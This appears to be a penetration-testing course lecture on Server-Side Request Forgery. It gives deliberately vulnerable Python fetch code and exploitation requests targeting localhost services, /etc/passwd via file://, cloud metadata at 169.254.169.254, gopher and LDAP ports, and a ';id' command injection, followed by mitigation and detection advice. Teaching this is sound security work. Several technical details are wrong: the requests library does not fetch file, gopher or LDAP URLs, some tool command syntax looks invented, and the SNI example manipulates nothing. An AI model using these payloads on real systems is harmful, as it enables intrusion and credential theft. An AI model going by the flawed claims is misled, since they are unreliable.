# SSRF (Server-Side Request Forgery)

## What you will learn in this course üßêüßê

- Understand the concept of SSRF (Server-Side Request Forgery)
- Learn how to exploit SSRF vulnerabilities

SSRF (Server-Side Request Forgery) occurs when an attacker tricks a server into making unauthorized requests. The attacker finds a vulnerability in the server, such as a feature that allows users to input a URL for the server to fetch data from. By inputting a URL pointing to an internal resource or sensitive endpoint (like `http://localhost`), the attacker can have the server access these restricted resources.

The impact can be severe, as it might reveal internal data or services that are not meant to be publicly accessible. For instance, the attacker might gain access to internal APIs, databases, or even configuration details. A typical SSRF request should work as follow:

1. The attacker manipulates server requests to access internal or external resources.
2. This allows unauthorized access to sensitive data or services from the server's perspective.
3. The attacker retrieves data or exploits vulnerabilities in internal systems accessible to the server.

![SSRF](https://cyber-lead-assets.s3.amazonaws.com/M01-Security_Evaluation_and_Testing_(Red)/D05-Web_Pentesting_02/01-lectures/SSRF.png)

### Basic SSRF Techniques

1. **Direct URL Manipulation**

**Explanation**: This technique involves exploiting a vulnerability where a web server takes user input to make HTTP requests. By manipulating the URL parameter, an attacker can make the server request internal or otherwise restricted resources.

**Example Vulnerable Code**:

```python
import requests

def fetch_data(url):
   response = requests.get(url)
   return response.text
```

In this example, the `fetch_data` function allows users to specify a URL which the server will then request.

**Exploitation Command**:

```http
GET /fetch_data?url=http://localhost/admin HTTP/1.1
Host: vulnerable-website.com
```

Here, the attacker provides `http://localhost/admin` as the URL, causing the server to request an internal admin page that is not directly accessible to external users.

2. **Whitelisted Domain Bypass**

**Explanation**: Some systems implement domain whitelisting to restrict access to certain URLs. An attacker can exploit this by using open redirects or manipulating the parameters to bypass these restrictions.

**Example Vulnerable Code**:

```python
allowed_domains = ["example.com"]

def fetch_data(url):
   if any(domain in url for domain in allowed_domains):
	   response = requests.get(url)
	   return response.text
   else:
	   raise ValueError("Domain not allowed")
```

In this code, the application only allows requests to `example.com`.

**Exploitation Command**:

```http
GET /fetch_data?url=http://example.com/redirect?url=http://internal-service HTTP/1.1
Host: vulnerable-website.com
```

The attacker uses an open redirect at `example.com` to route the request to an internal service.

### Protocol Exploitation

1. **HTTP and HTTPS**

**Explanation**: By using HTTP or HTTPS protocols, attackers can access internal services or endpoints that are only accessible within the network. The server makes a request on behalf of the attacker to these internal resources.

**Example Vulnerable Code**:

```python
import requests

def fetch_data(url):
   response = requests.get(url)
   return response.text
```

This code simply makes an HTTP GET request to the specified URL.

**Exploitation Command**:

```http
GET /fetch_data?url=http://localhost:9200 HTTP/1.1
Host: vulnerable-website.com
```

The attacker targets an internal Elasticsearch instance on port 9200.

2. **File Protocol**

**Explanation**: The `file://` protocol allows access to local files on the server. An attacker can use this to read sensitive files like `/etc/passwd`, which might contain user information or other sensitive data.

**Example Vulnerable Code**:

```python
import requests

def fetch_data(url):
   response = requests.get(url)
   return response.text
```

The server processes the URL and can request local files.

**Exploitation Command**:

```http
GET /fetch_data?url=file:///etc/passwd HTTP/1.1
Host: vulnerable-website.com
```

This command requests the server to read the `/etc/passwd` file, which contains user account information.

3. **Gopher Protocol**

**Explanation**: The Gopher protocol, though largely obsolete, can be used to interact with various services including TCP services. This protocol can be exploited to access internal services or exfiltrate data.

**Example Vulnerable Code**:

```python
import requests

def fetch_data(url):
   response = requests.get(url)
   return response.text
```

Similar to HTTP, but used with the Gopher protocol.

**Exploitation Command**:

```http
GET /fetch_data?url=gopher://localhost:25/_data HTTP/1.1
Host: vulnerable-website.com
```

This request targets an internal SMTP service on port 25.

4. **DICT, SFTP, TFTP, LDAP, SMTP**

**Explanation**: SSRF can also exploit other protocols such as DICT, SFTP, TFTP, LDAP, and SMTP. Each of these protocols provides different methods of interacting with services or accessing data.

**Example Vulnerable Code**:

```python
import requests

def fetch_data(url):
   response = requests.get(url)
   return response.text
```

The code can be used to make requests to services using various protocols.

**Exploitation Command** (e.g., LDAP):

```http
GET /fetch_data?url=ldap://localhost:389/ HTTP/1.1
Host: vulnerable-website.com
```

The attacker requests an internal LDAP service, potentially exposing directory information.

### Advanced Techniques

1. **DNS Rebinding**

**Explanation**: DNS rebinding tricks the server into bypassing the Same-Origin Policy (SOP) and making requests to internal network addresses. This is achieved by repeatedly changing the IP address associated with a domain name.

**Example Vulnerable Code**:

```python
import requests

def fetch_data(url):
   response = requests.get(url)
   return response.text
```

The server processes URLs without validating their origin.

**Exploitation Command**:

```http
GET /fetch_data?url=http://attacker.com HTTP/1.1
Host: vulnerable-website.com
```

The attacker sets up `attacker.com` to resolve to internal IPs, allowing access to internal services.

2. **Blind SSRF**

**Explanation**: In blind SSRF, the attacker does not receive direct feedback from the server but infers the results based on timing or other indirect responses. This technique relies on side effects or out-of-band signals to understand the impact.

**Example Vulnerable Code**:

```python
import requests

def fetch_data(url):
   response = requests.get(url)
   return response.status_code
```

The code returns only the HTTP status code, making it a candidate for blind SSRF.

**Exploitation Command**:

```http
GET /fetch_data?url=http://localhost:9200 HTTP/1.1
Host: vulnerable-website.com
```

The attacker infers the presence and behavior of internal services based on response codes or other indirect feedback.

3. **SSRF with Command Injection**

**Explanation**: Combining SSRF with command injection allows an attacker to execute arbitrary commands on the server by manipulating the URL parameter to inject shell commands.

**Example Vulnerable Code**:

```python
import os
import requests

def fetch_data(url):
   os.system(f"curl {url}")
```

This code uses `os.system` to execute shell commands, making it vulnerable to command injection.

**Exploitation Command**:

```http
GET /fetch_data?url=http://localhost:9200;id HTTP/1.1
Host: vulnerable-website.com
```

The attacker injects `;id` to execute the `id` command on the server.

### Bypassing Security Measures

1. **URL Globbing**

**Explanation**: URL globbing uses wildcard characters to bypass web application firewalls (WAFs) and other security controls that might filter specific patterns.

**Example Vulnerable Code**:

```python
import requests

def fetch_data(url):
   response = requests.get(url)
   return response.text
```

The code is vulnerable to URL manipulation using glob patterns.

**Exploitation Command**:

```bash
curl -g 'http://vulnerable-website.com/fetch_data?url=http://internal-service/*'
```

This command uses the `-g` option in `curl` to bypass URL encoding filters and access internal services.

2. **SNI Data Manipulation**

**Explanation**: Server Name Indication (SNI) allows multiple SSL certificates on the same IP address. Manipulating SNI data can redirect requests to internal services by exploiting SSL/TLS misconfigurations.

**Example Vulnerable Code**:

```python
import requests

def fetch_data(url):
   response = requests.get(url)
   return response.text
```

If the server does not properly handle SNI, it can be manipulated.

**Exploitation Command**:

```http
GET /fetch_data?url=https://internal-service:443 HTTP/1.1
Host: vulnerable-website.com
```

The attacker manipulates the SNI field to target internal services.

### SSRF in Cloud Environments

1. **Cloud Metadata Access**

**Explanation**: Many cloud providers offer metadata services accessible from within instances. Exploiting SSRF can allow attackers to access these metadata services and retrieve sensitive information such as instance credentials.

**Example Vulnerable Code**:

```python
import requests

def fetch_data(url):
   response = requests.get(url)
   return response.text
```

The server fetches data from the provided URL, including cloud metadata.

**Exploitation Command**:

```http
GET /fetch_data?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: vulnerable-website.com
```

This request targets the cloud metadata endpoint, potentially exposing sensitive instance details.

### Tools and Payloads

1. **SSRFMap**

**Explanation**: SSRFMap is a tool designed to detect and exploit SSRF vulnerabilities by automating the discovery of internal services and their potential vulnerabilities.

**Usage Command**:

```bash
ssrfmap -u "http://vulnerable-website.com/fetch_data?url=REPLACE_ME"
```

Replace `REPLACE_ME` with the target URL to find and exploit SSRF vulnerabilities.

2. **Gopherus**

**Explanation**: Gopherus is a tool that generates Gopher payloads for various services, making it easier to exploit SSRF vulnerabilities involving the Gopher protocol.

**Usage Command**:

```bash
gopherus -u "http://vulnerable-website.com/fetch_data?url=gopher://localhost:3306"
```

This command generates a Gopher payload to access a MySQL service running on port 3306.

3. **Remote-Method-Guesser**

**Explanation**: Remote-Method-Guesser is a Java RMI vulnerability scanner that can generate SSRF payloads targeting RMI services.

**Usage Command**:

```bash
remote-method-guesser -u "http://vulnerable-website.com/fetch_data?url=rmi://localhost:1099"
```

This tool helps in identifying and exploiting SSRF vulnerabilities in Java RMI services.

## Mitigation Techniques

To mitigate SSRF vulnerabilities, you should implement a multi-layered approach. Start by validating and sanitizing all user inputs that are used to make server-side requests. Ensure that URLs or any other input parameters are strictly controlled and validated against a predefined whitelist of allowed domains or IP addresses.

An essential part of preventing SSRF is validating and sanitizing all user inputs used in server-side requests. For example, you can restrict the URLs that the server is allowed to fetch by ensuring that only URLs with specific schemes and hostnames are permitted. Below is a secure implementation that demonstrates how to achieve this:

```python
import requests
from urllib.parse import urlparse

# Define allowed domains
ALLOWED_DOMAINS = ["example.com", "api.example.com"]

def is_valid_url(url):
    """Check if the URL is valid and allowed."""
    parsed_url = urlparse(url)
    # Ensure the scheme is http or https
    if parsed_url.scheme not in ["http", "https"]:
        return False
    # Check if the hostname is in the allowed domains
    if parsed_url.hostname not in ALLOWED_DOMAINS:
        return False
    return True

def fetch_data(url):
    """Fetch data from the provided URL if it's valid."""
    if not is_valid_url(url):
        raise ValueError("Invalid or unallowed URL")
    response = requests.get(url)
    return response.text
```

In this example, the `is_valid_url` function ensures that the URL uses either the `http` or `https` scheme and that the hostname is within an approved list of domains. This validation prevents requests to unauthorized or potentially dangerous locations. The `fetch_data` function uses this validation to ensure that only permitted URLs are accessed.

Additionally, it's important to implement network segmentation to isolate internal services from public-facing applications, minimizing the risk of unauthorized access. Employing robust firewall rules and network access controls can further restrict outbound traffic from servers, preventing them from reaching sensitive internal resources.

Advanced web application firewalls (WAFs) should be considered to detect and block SSRF attempts, as they are designed to inspect and filter requests based on known attack patterns. Implementing comprehensive logging and monitoring will help detect any unusual or unauthorized requests, allowing for prompt responses to potential SSRF exploitation. Regularly auditing and reviewing server configurations ensures they remain aligned with security best practices, adapting to evolving threats.

## Detection Techniques

To detect SSRF vulnerabilities, employ a combination of manual and automated methods. Utilize vulnerability scanners and penetration testing tools to identify potential SSRF flaws by testing for improper handling of URL input and unexpected outbound requests.

Analyze server logs and network traffic for anomalies or unauthorized requests that could indicate SSRF exploitation. Look for patterns such as unexpected access to internal services or unusual outbound traffic from servers. Implement real-time monitoring with web application firewalls (WAFs) and network intrusion detection systems (IDS) to flag and block suspicious SSRF activities as they occur. Regularly review these monitoring tools and update their rules to keep up with evolving attack techniques.

## Resources

- [SSRF in the Cloud](https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.md)
- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
